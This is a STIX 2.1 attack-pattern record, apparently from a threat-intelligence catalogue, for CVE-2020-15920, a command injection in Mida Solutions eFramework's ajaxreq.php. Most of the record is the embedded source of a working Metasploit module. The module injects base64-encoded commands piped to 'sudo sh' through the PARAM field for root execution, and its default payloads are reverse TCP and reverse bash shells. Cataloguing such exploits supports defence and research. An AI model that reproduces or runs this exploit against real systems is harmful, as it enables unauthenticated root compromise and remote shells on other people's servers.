{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--17b44c43-d584-42cd-93f3-22b929750bc7",
    "created": "2024-08-14T17:00:16.472932Z",
    "modified": "2024-08-14T17:00:16.472936Z",
    "name": "Mida Solutions eFramework ajaxreq.php Command Injection",
    "description": " This module exploits a command injection vulnerability in Mida Solutions eFramework version 2.9.0 and prior.  The `ajaxreq.php` file allows unauthenticated users to inject arbitrary commands in the `PARAM` parameter to be executed as the apache user. The sudo configuration permits the apache user to execute any command as root without providing a password resulting in privileged command execution as root.  This module has been successfully tested on Mida Solutions eFramework-C7-2.9.0 virtual appliance.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mida_solutions_eframework_ajaxreq_rce.rb",
            "external_id": "mida_solutions_eframework_ajaxreq_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-15920"
        },
        {
            "source_name": "reference",
            "url": "https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mida Solutions eFramework ajaxreq.php Command Injection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in Mida\n          Solutions eFramework version 2.9.0 and prior.\n\n          The `ajaxreq.php` file allows unauthenticated users to inject\n          arbitrary commands in the `PARAM` parameter to be executed as\n          the apache user. The sudo configuration permits the apache user\n          to execute any command as root without providing a password,\n          resulting in privileged command execution as root.\n\n          This module has been successfully tested on Mida Solutions\n          eFramework-C7-2.9.0 virtual appliance.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'elbae', # discovery and exploit\n          'bcoles', # Metasploit\n        ],\n        'References' => [\n          ['CVE', '2020-15920'],\n          ['EDB', '48768'],\n          ['URL', 'https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html'],\n        ],\n        'Payload' => { 'BadChars' => \"\\x00\" },\n        'Targets' => [\n          [\n            'Linux (x86)', {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Linux (x64)', {\n              'Arch' => ARCH_X64,\n              'Platform' => 'linux',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'UNIX (cmd)', {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix',\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-07-24',\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 1,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path to eFramework', '/'])\n    ])\n  end\n\n  def check\n    res = execute_command('id')\n\n    unless res\n      return CheckCode::Safe('Connection failed')\n    end\n\n    unless res.body.include?('uid=')\n      return CheckCode::Safe('Target is not vulnerable')\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def execute_command(cmd, _opts = {})\n    vars_post = {\n      'DIAGNOSIS' => ['PING', 'TRACEROUTE'].sample,\n      'PARAM' => \";echo #{Rex::Text.encode_base64(cmd)}|base64 -d|sudo sh\"\n    }\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'PDC', 'ajaxreq.php'),\n      'vars_post' => vars_post\n    }, 5)\n\n    if res && !res.body.blank?\n      vprint_status(\"Command output: #{res.body.gsub(/<br>/, \"\\n\")}\")\n    end\n\n    res\n  end\n\n  def exploit\n    if target.arch.first == ARCH_CMD\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(linemax: 1_500, background: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-07-24",
    "x_mitre_platforms": [
        "unix'"
    ]
}